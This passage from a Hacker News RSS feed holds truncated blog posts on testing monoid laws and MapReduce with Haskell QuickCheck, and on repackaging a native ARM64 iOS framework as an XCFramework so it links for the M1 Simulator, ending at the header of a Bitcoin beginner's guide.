            <link>https://www.senfcall.de/en/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112448</guid>
            <pubDate>Fri, 12 Feb 2021 11:17:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fuzz me wrong – How QuickCheck destroyed my favourite theory]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 56 (<a href="https://news.ycombinator.com/item?id=26112441">thread link</a>) | @lrngjcb
<br/>
February 12, 2021 | https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html | <a href="https://web.archive.org/web/*/https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    
    <div>
    <p><em>Posted on January 30, 2021
    
        by Thomas Mahler
    </em></p></div>

<h2 id="introduction">Introduction</h2>
<p>Quite a while back I wrote a larger article on the algebraic foundation of software patterns which also covered the <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">MapReduce algorithm</a>.</p>
<p>During the research digged out a paper on <a href="https://pdfs.semanticscholar.org/0498/3a1c0d6343e21129aaffca2a1b3eec419523.pdf">algebraic properties of distributed big data analytics</a>, which explained that a MapReduce will always work correctly when the intermediate data structure resulting from the <code>map</code>-phase is a Monoid under the <code>reduce</code>-operation.</p>
<p>For some reason, I was not convinced that this Monoid-condition was enough, because all the typical examples like word-frequency maps are even <strong>commutative</strong> Monoids under the respective reduce operation.</p>
<p>So I came up with the following personal theory:</p>
<blockquote>
<p>Only if the intermediate data structure resulting from the <code>map</code>-phase is a <strong>commutative Monoid</strong> under the <code>reduce</code>-operation, then a parallel MapReduce will produce correct results.</p>
</blockquote>
<p>I tried to validate this property using the <a href="https://wiki.haskell.org/Introduction_to_QuickCheck2">QuickCheck test framework</a>.</p>
<p>Interestingly the QuickCheck tests failed! This finally convinced me that my theory was wrong, and after a little deeper thought, I could understand why.</p>
<p>I was impressed with the power of QuickCheck, so I thought it would be a good idea to share this lesson in falsification.</p>
<p>The code shown in this blog <a href="https://github.com/thma/CommutativeMonoid">is also available on GitHub</a></p>
<h2 id="commutative-monoids">Commutative Monoids</h2>
<p>In abstract algebra, a monoid is a <em>set</em> equipped with an <em>associative binary operation</em> and an <em>identity element</em>.</p>
<p>The simplest example for a <em>commutative Monoid</em> is <span>\((\mathbb{N}_0, +, 0)\)</span>: the natural numbers under addition with <span>\(0\)</span> as the identity (or neutral) element. We can use QuickCheck to verify that indeed the Monoid laws plus commutativity are maintained.</p>
<p>If we want to use <code>GHC.Natural</code> type to represent natural numbers, we first have to make <code>Natural</code> instantiate the <code>Arbitrary</code> type class which is used by QuickCheck to automatically generate test data:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>import</span>           <span>Test.QuickCheck</span> (<span>Arbitrary</span>, arbitrary, <span>NonNegative</span> (..))</span>
<span id="cb1-2"><span>import</span>           <span>GHC.Natural</span>     (<span>Natural</span>, naturalFromInteger)</span>
<span id="cb1-3"></span>
<span id="cb1-4"><span>instance</span> <span>Arbitrary</span> <span>Natural</span> <span>where</span></span>
<span id="cb1-5">  arbitrary <span>=</span> <span>do</span></span>
<span id="cb1-6">    <span>NonNegative</span> nonNegative <span>&lt;-</span> arbitrary</span>
<span id="cb1-7">    <span>return</span> <span>$</span> naturalFromInteger nonNegative</span></code></pre></div>
<p>Now we can start to write our property based tests. For algebraic structures it is straightforward to come up with properties: we just write the required laws (associativity, 0 is identity element and commutativity) as properties.</p>
<p>I am using Hspec as a wrapper around QuickCheck as it provides a very nice testing DSL which makes it easy to read the code and the output of the test suite:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>import</span>           <span>Test.Hspec</span></span>
<span id="cb2-2"></span>
<span id="cb2-3"><span>spec ::</span> <span>Spec</span></span>
<span id="cb2-4">spec <span>=</span> <span>do</span></span>
<span id="cb2-5">  describe <span>"The Monoid 'Natural Numbers under Addition'"</span> <span>$</span> <span>do</span></span>
<span id="cb2-6">    it <span>"is associative"</span> <span>$</span></span>
<span id="cb2-7">      property <span>$</span> \x y z <span>-&gt;</span> ((x <span>+</span> y) <span>+</span> z) <span>`shouldBe`</span> ((x <span>+</span> (y <span>+</span> z))<span> ::</span> <span>Natural</span>)</span>
<span id="cb2-8">      </span>
<span id="cb2-9">    it <span>"has 0 as left and right identity element"</span> <span>$</span></span>
<span id="cb2-10">      property <span>$</span> \x <span>-&gt;</span> (x <span>+</span> <span>0</span> <span>`shouldBe`</span> (<span>x ::</span> <span>Natural</span>)) <span>.&amp;&amp;.</span> (<span>0</span> <span>+</span> x <span>`shouldBe`</span> x)</span>
<span id="cb2-11">      </span>
<span id="cb2-12">    it <span>"is commutative"</span> <span>$</span></span>
<span id="cb2-13">      property <span>$</span> \x y <span>-&gt;</span> x <span>+</span> y <span>`shouldBe`</span> (y <span>+</span><span> x ::</span> <span>Natural</span>)</span></code></pre></div>
<p>The output of these tests will be as follows:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>Monoid</span></span>
<span id="cb3-2">  <span>The</span> Monoid <span>'Natural Numbers under Addition'</span></span>
<span id="cb3-3">    <span>is</span> associative</span>
<span id="cb3-4">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-5">    <span>has</span> 0 as identity (or neutral) <span>element</span></span>
<span id="cb3-6">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-7">    <span>is</span> commutative</span>
<span id="cb3-8">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>So behind the scenes, QuickCheck has generated test data for 100 tests for each property under test. For all these data the test cases passed.</p>
<p>This is definitely not a proof. But it gives us some confidence that our math text-books are correct when giving Natural Numbers under addition as an example for a commutative Monoid.</p>
<p>OK, that was easy! Now let’s move to non-commutative Monoids.</p>
<h2 id="non-commutative-monoids">Non-commutative Monoids</h2>
<p>Strings (or any other Lists) under concatenation are a typical example. It’s easy to see that <code>"hello" ++ ("dear" ++ "people")</code> equals <code>"(hello" ++ "dear") ++ "people"</code>, but that <code>"hello" ++ "world"</code> differs from <code>"world" ++ "hello"</code>.</p>
<p>Now let’s try to formalize these intuitions as QuickCheck property based tests again.</p>
<p>First I’m introducing an alias for <code>(++)</code>, as it is defined on any list type, it would be required to have type signatures in all properties (as we had all those <code>:: Natural</code> signatures in the examples above). So I define an operation <code>(⊕)</code> which is only defined on <code>String</code> instances:</p>
<div id="cb4"><pre><code><span id="cb4-1">(⊕)<span> ::</span> <span>String</span> <span>-&gt;</span> <span>String</span> <span>-&gt;</span> <span>String</span></span>
<span id="cb4-2">(⊕) a b <span>=</span> a <span>++</span> b</span></code></pre></div>
<p>Now we can extend our test suite with the following test cases:</p>
<div id="cb5"><pre><code><span id="cb5-1">  describe <span>"The Monoid 'Strings under concatenation'"</span> <span>$</span> <span>do</span></span>
<span id="cb5-2">    </span>
<span id="cb5-3">    it <span>"is associative"</span> <span>$</span> </span>
<span id="cb5-4">      property <span>$</span> \x y z <span>-&gt;</span> ((x ⊕ y) ⊕ z) <span>`shouldBe`</span> (x ⊕ (y ⊕ z))</span>
<span id="cb5-5">      </span>
<span id="cb5-6">    it <span>"has \"\" as left and right identity element"</span> <span>$</span></span>
<span id="cb5-7">      property <span>$</span> \x <span>-&gt;</span> (x ⊕ <span>""</span> <span>`shouldBe`</span> x) <span>.&amp;&amp;.</span> (<span>""</span> ⊕ x <span>`shouldBe`</span> x)</span></code></pre></div>
<p>The output looks promising:</p>
<div id="cb6"><pre><code><span id="cb6-1">  <span>The</span> Monoid <span>'Strings under concatenation'</span></span>
<span id="cb6-2">    <span>is</span> associative</span>
<span id="cb6-3">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb6-4">    <span>has</span> <span>""</span> as left and right identity element</span>
<span id="cb6-5">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>Now let’s try to test the non-commutativity:</p>
<div id="cb7"><pre><code><span id="cb7-1">    it <span>"is NOT commutative"</span> <span>$</span></span>
<span id="cb7-2">      property <span>$</span> \x y <span>-&gt;</span> x ⊕ y <span>`shouldNotBe`</span> y ⊕ x</span></code></pre></div>
<p>But unfortunately the output tells us that this is not true:</p>
<div id="cb8"><pre><code><span id="cb8-1">    <span>is</span> NOT commutative FAILED [1]</span>
<span id="cb8-2"></span>
<span id="cb8-3">  <span>1</span>) <span>Monoid</span>, The Monoid <span>'Strings under concatenation'</span>, is NOT commutative</span>
<span id="cb8-4">       <span>Falsifiable</span> (after 1 test)<span>:</span></span>
<span id="cb8-5">         <span>""</span></span>
<span id="cb8-6">         <span>""</span></span>
<span id="cb8-7">       <span>not</span> expected: <span>""</span></span></code></pre></div>
<p>We formulated the property in the wrong way. The <code>(⊕)</code> <em>may be commutative for some</em> edge cases, e.g.&nbsp;when one or both of the arguments are <code>""</code>. But it is not commutative <em>in general</em> – that is for all possible arguments.</p>
<p>We could rephrase this property as <em>“There exists at least one pair of arguments <span>\((x, y)\)</span> for which <span>\(\oplus\)</span> is not commutative”</em>:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ]\]</span></p>
<p>QuickCheck does not come with a mechanism for <em>existential quantification</em>. But as is has <code>forAll</code>, that is <em>universal quantification</em>. So we can try to make use of the following equivalence:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ] 
  \equiv 
  \neg \forall (x,y) \left [ x \oplus y = y \oplus x \right ]\]</span></p>
<p>Unfortunately we can not write this simply as <code>not forAll</code>, as <code>forAll</code> returns a <code>Property</code> but <code>not</code> expects a <code>Bool</code>. But as explained in <a href="https://stackoverflow.com/questions/42764847/is-there-a-there-exists-quantifier-in-quickcheck">this discussion on Stackoverflow</a> it is still posible to implement our own <code>exists</code>:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>exists ::</span> (<span>Show</span> a, <span>Arbitrary</span> a) <span>=&gt;</span> (a <span>-&gt;</span> <span>Bool</span>) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-2">exists <span>=</span> forSome <span>$</span> resize <span>1000</span> arbitrary</span>
<span id="cb9-3"></span>
<span id="cb9-4"><span>forSome ::</span> (<span>Show</span> a, <span>Testable</span> prop) <span>=&gt;</span> <span>Gen</span> a <span>-&gt;</span> (a <span>-&gt;</span> prop) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-5">forSome gen prop <span>=</span></span>
<span id="cb9-6">  mapResult (\r <span>-&gt;</span> r {P.reason <span>=</span> <span>"No witness found."</span>, P.callbacks <span>=</span> []}) <span>$</span></span>
<span id="cb9-7">    once <span>$</span> disjoin <span>$</span> <span>replicate</span> <span>1000</span> <span>$</span> forAll gen prop</span></code></pre></div>
<p>Now we can rewrite the property <span>\(\exists (x,y) \left [ x \oplus y \neq y \oplus x \right ]\)</span> as follows:</p>
<div id="cb10"><pre><code><span id="cb10-1">    it <span>"is not commutative (via exists)"</span> <span>$</span></span>
<span id="cb10-2">      exists <span>$</span> \(x,y) <span>-&gt;</span> x ⊕ y <span>/=</span> y ⊕ x</span></code></pre></div>
<p>I like how close the Haskell code stays to the concise mathematical formulation! The output of this test fits much better into our intuitive understanding:</p>
<div id="cb11"><pre><code><span id="cb11-1">    <span>is</span> not commutative (via exists)</span>
<span id="cb11-2">      <span>+++</span> OK, passed 1 test.</span></code></pre></div>
<h2 id="sequential-mapreduce">Sequential MapReduce</h2>
<blockquote>
<p>MapReduce is a programming model and an associated implementation for processing and generating large data sets. Users specify <strong>a map function</strong> that processes a key/value pair to generate a set of intermediate key/value pairs, <strong>and a reduce function</strong> that merges all intermediate values associated with the same intermediate key.</p>
<p>[This] abstraction is inspired by the map and reduce primitives present in Lisp and many other functional languages. <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/16cb30b4b92fd4989b8619a61752a2387c6dd474.pdf">Quoted from Google Research</a></p>
</blockquote>
<p>I’m not going into more details here, as You’ll find detailed information on this approach and a working example <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">in my original article</a>.</p>
<p>Here is the definition of a sequential MapReduce:</p>
<div id="cb12"><pre><code><span id="cb12-1">simpleMapReduce </span>
<span id="cb12-2"><span>  ::</span> (a <span>-&gt;</span> b)   <span>-- map function</span></span>
<span id="cb12-3">  <span>-&gt;</span> ([b] <span>-&gt;</span> c) <span>-- reduce function</span></span>
<span id="cb12-4">  <span>-&gt;</span> [a]        <span>-- list to map over</span></span>
<span id="cb12-5">  <span>-&gt;</span> c          <span>-- result</span></span>
<span id="cb12-6">simpleMapReduce mapFunc reduceFunc <span>=</span> reduceFunc <span>.</span> <span>map</span> mapFunc</span></code></pre></div>
<p>We can test the sequential MapReduce algorithm with the following property based test:</p>
<div id="cb13"><pre><code><span id="cb13-1">    it <span>"works correctly with a sequential map-reduce"</span> <span>$</span></span>
<span id="cb13-2">      property <span>$</span> \a b c d <span>-&gt;</span> (simpleMapReduce <span>reverse</span> (<span>foldr</span> (⊕) <span>""</span>) [a,b,c,d]) </span>
<span id="cb13-3">                     <span>`shouldBe`</span> (<span>reverse</span> a) ⊕ (<span>reverse</span> b) ⊕ (<span>reverse</span> c) ⊕ (<span>reverse</span> d)</span></code></pre></div>
<h3 id="excurs-foldmap">Excurs: foldMap</h3>
<p>What I have shown so far just demonstrates the general mechanism of chaining <code>map</code> and <code>reduce</code> functions without implying any parallel execution. Essentially we are chaining a <code>map</code> with a <code>fold</code> (i.e.&nbsp;reduction) function. In the Haskell base library there is a higher order function <code>foldMap</code> that covers exactly this pattern of chaining. Please note that <code>foldMap</code>does only a single traversal of the foldable data structure. It fuses the <code>map</code> and <code>reduce</code> phase into a single one by function composition of <code>mappend</code> and the mapping function <code>f</code>:</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>-- | Map each element of the structure to a monoid,</span></span>
<span id="cb14-2"><span>-- and combine the results.</span></span>
<span id="cb14-3"><span>foldMap</span><span> ::</span> (<span>Foldable</span> t, <span>Monoid</span> m) <span>=&gt;</span> (a <span>-&gt;</span> m) <span>-&gt;</span> t a <span>-&gt;</span> m</span>
<span id="cb14-4"><span>foldMap</span> f <span>=</span> <span>foldr</span> (<span>mappend</span> <span>.</span> f) <span>mempty</span></span></code></pre></div>
<h2 id="parallel-mapreduce">Parallel MapReduce</h2>
<p>Now we come to the tricky part that kicked off this whole discussion: parallelism.</p>
<p>As an example we consider a simple sequential MapReduce, taking an input list of <code>Int</code>s, computing their squares and computing the sum of these squares:</p>
<div id="cb15"><pre><code><span id="cb15-1">λ<span>&gt;</span> simpleMapReduce (<span>^</span><span>2</span>) (<span>foldr</span> (<span>+</span>) <span>0</span>) [<span>1</span>,<span>2</span>,<span>3</span>,<span>4</span>]</span>
<span id="cb15-2"><span>30</span></span></code></pre></div>
<p>Let’s try to design this as a massively parallelized algorithm:</p>
<ol type="1">
<li><p>Mapping of <code>(^2)</code> over the input-list <code>[1,2,3,4]</code> would be started in parallel to the reduction of the intermediary list of squares by <code>(foldr (+) 0)</code>.</p></li>
<li><p>The mapping phase will be executed as a set of parallel computations (one for each element of the input list).</p></li>
<li><p>The reduction phase will also be executed as a set of parallel computations (one for each addition).</p></li>
</ol>
<p>Of course the reduction phase can begin only when at least one list element is squared. So in effect the mapping process would have to start first. The parallel computation of squares will result in a non-deterministic sequence of computations. In particular it is not guaranteed that all elements of the input list are processed in the original list order. So it might for example …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</a></em></p>]]>
            </description>
            <link>https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112441</guid>
            <pubDate>Fri, 12 Feb 2021 11:16:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking native ARM64 binaries to run on the iOS Simulator]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26112198">thread link</a>) | @bogo_
<br/>
February 12, 2021 | https://bogo.wtf/arm64-to-sim.html | <a href="https://web.archive.org/web/*/https://bogo.wtf/arm64-to-sim.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>
    <time datetime="2021-02-10 23:37:00 +0000">2021-02-10</time>
  </p>

  
  <em>a 21 minute read (and <a href="https://github.com/bogo/arm64-to-sim">sources</a>) by <a href="https://twitter.com/giertler">Bogo Giertler</a></em>

  <p><img src="https://bogo.wtf/assets/images//Full%20Screenshot.png" alt="M1 Simulator + ARM64"></p>

<p>The screenshot above looks perfectly normal - until you realize that the sample app running on this M1 MacBook is actually a legacy Spotify SDK demo from 2017. Its proprietary binary framework has never been rebuilt to support M1 Macs and cannot run on Apple’s newest computers, unless Xcode is launched through <a href="https://developer.apple.com/documentation/apple_silicon/about_the_rosetta_translation_environment">Rosetta 2</a>.</p>

<p>If you have an M1 Mac, you probably already encountered this issue. A couple of seconds after hitting Run on your favorite project (and going <em>wow, those M1 Macs sure are fast!</em>), you were likely greeted with this:</p>

<p><img src="https://bogo.wtf/assets/images//Xcode%20Linker%20Error.png" alt="Xcode Linker Error"></p>

<div><div><pre><code>ld: in ../../SpotifyiOS.framework/SpotifyiOS(MPMessagePackReader.o), building for iOS Simulator, but linking in object file built for iOS, file '../../SpotifyiOS.framework/SpotifyiOS' for architecture arm64
clang: error: linker command failed with exit code 1 (use -v to see invocation)
</code></pre></div></div>

<p>In plain English, the proprietary binary framework you’ve been using in your project has not been updated to support iOS Simulator running on M1 Macs. Apple’s advice in this situation is to reach out to the vendor and ask them to release an updated version of the framework - both by migrating it to an XCFramework format, and by rebuilding it to support M1 simulators.</p>

<p>There is a lot of reasons why you might not get your hands on that updated framework anytime soon - or even at all. Commonly, the third-party vendor is slow to react, or you are pinning to a previous major version of the framework for compatibility reasons. Since you likely do not have sources for the original library, you cannot rebuild it yourself either. This means no Simulator builds and no local unit and UI tests. You seemingly hit a dead end and development on an M1 Mac will be very difficult for time being. Or did you?</p>

<p>Last week, I ran into this issue with <a href="https://github.com/spotify/ios-sdk">Spotify’s iOS SDK</a>. With the binary release not updated for over a year, I had to find a way to hack the native ARM64 binary to run in the Simulator. On the way, I learnt a lot about frameworks, binaries, and loaders.  You can find the complete sources for <a href="https://github.com/bogo/arm64-to-sim">arm64-to-sim</a> on GitHub. What follows is a detailed explanation of the ARM64 transmogrification.</p>

<h2 id="-an-idea-takes-root">💡 An Idea Takes Root</h2>
<p>Let’s take a look at the error message again. The error we receive isn’t actually a compiler error - it’s a linker error. <code>ld</code> complains that we are attempting to link in a binary that was compiled for <em>native</em> ARM64 to a binary that is being built for <em>iOS Simulator</em> ARM64.</p>

<p>Historically, the ARM/x86 bifurcation in the Apple product line meant that one could safely assume that code built for <code>i386</code> and <code>x86_64</code> was meant for the Simulator, and code built for <code>armv7</code> and <code>arm64</code> was meant for native devices. This found reflection in <a href="https://en.wikipedia.org/wiki/Fat_binary">fat (universal) binaries</a> being a widely used hack for distributing frameworks for Apple platforms that could be used both for devices and simulators.</p>

<p>With the release of M1 Macs, this assumption no longer holds true - an ARM64 slice can now be meant for either. Under the guise of supporting macOS, iOS, watchOS, and tvOS in a single framework, in 2019 Apple released a new bundle framework format, <a href="https://developer.apple.com/videos/play/wwdc2019/416/">XCFramework</a>.</p>

<p>This should give us an idea: since, as indicated by the <code>ld</code> error, we already have a native ARM64 slice in our library, maybe we can repackage it as an iOS Simulator-supporting XCFramework. There is no technical reason why it <em>shouldn’t</em> work - a compiled binary links against symbols of other frameworks and binaries. Since iOS devices and M1 Macs use the same ARM64 instruction set, if the symbols of native and Simulator libraries are sufficiently similar, the library should simply work. We will just need to apply a lot of elbow grease.</p>

<h2 id="-the-anatomy-of-a-xcframework">🫀 The Anatomy of a (XC)Framework</h2>
<p>XCFramework is a pretty straightforward format that is meant to be a drop-in replacement for the original Cocoa Frameworks. Essentially, each XCFramework is a directory containing a property list telling the linker where to find architecture- and plaform-specific copies of each framework.</p>

<p>An example XCFramework looks as follows:</p>

<div><div><pre><code>Example.xcframework/
|-- Info.plist
|-- ios-arm64/
|   +-- Example.framework/
+-- ios-arm64_x86_64-simulator/
    +-- Example.framework/
</code></pre></div></div>

<p>The actual mapping of individual frameworks to platforms is done in the <code>Info.plist</code> file. Notice the <code>SupportedArchitectures</code>, <code>SupportedPlatform</code>, and <code>SupportedPlatformVariant</code> properties.</p>

<div><div><pre><code><span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span>
<span>&lt;plist</span> <span>version=</span><span>"1.0"</span><span>&gt;</span>
<span>&lt;dict&gt;</span>
	<span>&lt;key&gt;</span>AvailableLibraries<span>&lt;/key&gt;</span>
	<span>&lt;array&gt;</span>
		<span>&lt;dict&gt;</span>
			<span>&lt;key&gt;</span>LibraryIdentifier<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>ios-arm64<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>LibraryPath<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>Example.framework<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>SupportedArchitectures<span>&lt;/key&gt;</span>
			<span>&lt;array&gt;</span>
				<span>&lt;string&gt;</span>arm64<span>&lt;/string&gt;</span>
			<span>&lt;/array&gt;</span>
			<span>&lt;key&gt;</span>SupportedPlatform<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>ios<span>&lt;/string&gt;</span>
		<span>&lt;/dict&gt;</span>
		<span>&lt;dict&gt;</span>
			<span>&lt;key&gt;</span>LibraryIdentifier<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>ios-arm64_x86_64-simulator<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>LibraryPath<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>Example.framework<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>SupportedArchitectures<span>&lt;/key&gt;</span>
			<span>&lt;array&gt;</span>
				<span>&lt;string&gt;</span>arm64<span>&lt;/string&gt;</span>
				<span>&lt;string&gt;</span>x86_64<span>&lt;/string&gt;</span>
			<span>&lt;/array&gt;</span>
			<span>&lt;key&gt;</span>SupportedPlatform<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>ios<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>SupportedPlatformVariant<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>simulator<span>&lt;/string&gt;</span>
		<span>&lt;/dict&gt;</span>
	<span>&lt;/array&gt;</span>
	<span>&lt;key&gt;</span>CFBundlePackageType<span>&lt;/key&gt;</span>
	<span>&lt;string&gt;</span>XFWK<span>&lt;/string&gt;</span>
	<span>&lt;key&gt;</span>XCFrameworkFormatVersion<span>&lt;/key&gt;</span>
	<span>&lt;string&gt;</span>1.0<span>&lt;/string&gt;</span>
<span>&lt;/dict&gt;</span>
<span>&lt;/plist&gt;</span>
</code></pre></div></div>

<p>After creating a relevant folder structure and dropping in an <code>Info.plist</code> alongside our legacy <code>.framework</code>, we should now have a real <code>.xcframework</code> on our hands. Let’s emplace the original <code>.framework</code> in Xcode with it and try to build. Of course, it would be too easy if it worked - instead, we get the following:</p>

<p><img src="https://bogo.wtf/assets/images//Xcode%20Linker%20Error%20with%20XCFramework.png" alt="Xcode Linker Error - with XCFramework"></p>

<div><div><pre><code>ld: in /Users/bogo/Library/Developer/Xcode/DerivedData/NowPlayingView-aeukgqexpeqlsrdzslkpeehveixs/Build/Products/Debug-iphonesimulator/SpotifyiOS.framework/SpotifyiOS(MPMessagePackReader.o), building for iOS Simulator, but linking in object file built for iOS, file '/Users/bogo/Library/Developer/Xcode/DerivedData/NowPlayingView-aeukgqexpeqlsrdzslkpeehveixs/Build/Products/Debug-iphonesimulator/SpotifyiOS.framework/SpotifyiOS' for architecture arm64
clang: error: linker command failed with exit code 1 (use -v to see invocation)
</code></pre></div></div>

<p>Since the Cocoa Framework is coming from <code>DerivedData</code>, we can be sure we assembled our XCFramework correctly. Still, we are back to square one - despite our naïve wrapping, the linker can still tell that we are bringing in a native library. Here’s our new objective: to find a way to convince <code>ld</code> that the library is actually a Simulator library.</p>

<h2 id="️-into-the-binary">🕵️ Into the Binary</h2>

<p>Let’s take a look inside our framework and see what files could be informing it about the platform.</p>

<div><div><pre><code>Example.framework/
|-- Info.plist
|-- Example
|-- Headers/
|   |-- A.h
|   |-- B.h
|   +-- C.h
+-- Modules/
    +-- module.modulemap
</code></pre></div></div>

<p>Cursory browsing of the human-readable contents of the framework does not yield any hints, so the linker must be using the contents of the binary file itself to infer the Simulator information. Since, we don’t really know what to look for, let’s dig into the binaries of other XCFrameworks out there first.</p>

<p><a href="https://github.com/firebase/firebase-ios-sdk/blob/master/Package.swift#L244">FirebaseAnalytics.xcframework</a> is a particularly good XCFramework to investigate - it contains both native and Simulator binaries. The obvious first idea is to search for Simulator references in the human-readable strings of the binary:</p>

<div><div><pre><code><span># in the FirebaseAnalytics.xcframework directory</span>
<span>$ </span>strings ios-arm64_i386_x86_64-simulator/FirebaseAnalytics.framework/FirebaseAnalytics | <span>grep</span> <span>-i</span> sim
</code></pre></div></div>

<p>The result is a bunch of rather uninteresting strings, none of them mentioning the Simulator. We can make an educated guess that the Simulator information is thus encoded in the machine-readable segment of the binary. To extract it, we can use <code>otool</code> - a tool meant to explore the executable files produced by LLVM. The <code>-fahl</code> parameter prints the relevant  fat, archive, and Mach-O headers, as well as the load commands.</p>

<div><div><pre><code><span># in the FirebaseAnalytics.xcframework directory</span>
<span>$ </span>otool <span>-fahl</span> ios-arm64_i386_x86_64-simulator/FirebaseAnalytics.framework/FirebaseAnalytics
<span>(</span>...<span>)</span>
Load <span>command </span>2
      cmd LC_LINKER_OPTIMIZATION_HINT
  cmdsize 16
  dataoff 12464
 datasize 760
Load <span>command </span>3
     cmd LC_SYMTAB
 cmdsize 24
  symoff 13224
   nsyms 201
  stroff 16440
 strsize 5064
<span>(</span>...<span>)</span>
</code></pre></div></div>

<p>Whoops, that’s a lot of data! The offsets and addresses and sizes are doing us no good and are likely to be different between platforms. Let’s constrain our search to load commands, save the results, and compare them:</p>

<div><div><pre><code><span># in the FirebaseAnalytics.xcframework directory</span>
<span>$ </span>otool <span>-fahl</span> ios-arm64_i386_x86_64-simulator/FirebaseAnalytics.framework/FirebaseAnalytics | <span>grep</span> <span>-E</span> <span>'cmd |\.o'</span> <span>&gt;</span> simulator_cmds

<span>$ </span>otool <span>-fahl</span> ios-arm64_armv7/FirebaseAnalytics.framework/FirebaseAnalytics | <span>grep</span> <span>-E</span> <span>'cmd |\.o'</span> <span>&gt;</span> native_cmds

<span>$ </span>diff <span>-u</span> native_cmds simulator_cmds
<span>-ios-arm64_armv7</span>/FirebaseAnalytics.framework/FirebaseAnalytics<span>(</span>FirebaseAnalytics_vers.o<span>)</span>:
+ios-arm64_i386_x86_64-simulator/FirebaseAnalytics.framework/FirebaseAnalytics<span>(</span>FirebaseAnalytics_vers.o<span>)</span>:
       cmd LC_SEGMENT_64
-      cmd LC_VERSION_MIN_IPHONEOS
+      cmd LC_BUILD_VERSION
      cmd LC_SYMTAB
<span>(</span>...<span>)</span>
</code></pre></div></div>

<p>Alright, we got a match! Seems that the Simulator binary contains  an <code>LC_BUILD_VERSION</code> load command, while the native binary contains an <code>LC_VERSION_MIN_IPHONEOS</code> load command in the same place. A pass with <code>otool</code> on our unsupported, native-only <code>.framework</code> confirms this theory. A bit of Googling reveals that <a href="https://reviews.llvm.org/D85358">this specific difference</a> is used by LLDB to distinguish Simulator and native binaries. We are on the right track then - looks like substituting <code>LC_VERSION_MIN_IPHONEOS</code> with <code>LC_BUILD_VERSION</code> might be just enough to fool <code>ld</code>.</p>

<h2 id="-meet-the-librarian">📚 Meet the Librarian</h2>
<p>So far, we’ve been playing with a fat binary, containing multiple platform-specific slices. We can see architectures available in a binary using the <code>file</code> command:</p>

<div><div><pre><code><span>$ </span>file Example.framework/Example</code></pre></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bogo.wtf/arm64-to-sim.html">https://bogo.wtf/arm64-to-sim.html</a></em></p>]]>
            </description>
            <link>https://bogo.wtf/arm64-to-sim.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112198</guid>
            <pubDate>Fri, 12 Feb 2021 10:30:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner’s Guide to Getting Started with Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26112188">thread link</a>) | @crecker
<br/>
February 12, 2021 | https://serhack.me/articles/getting-started-with-bitcoin/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/getting-started-with-bitcoin/">archive.org</a>
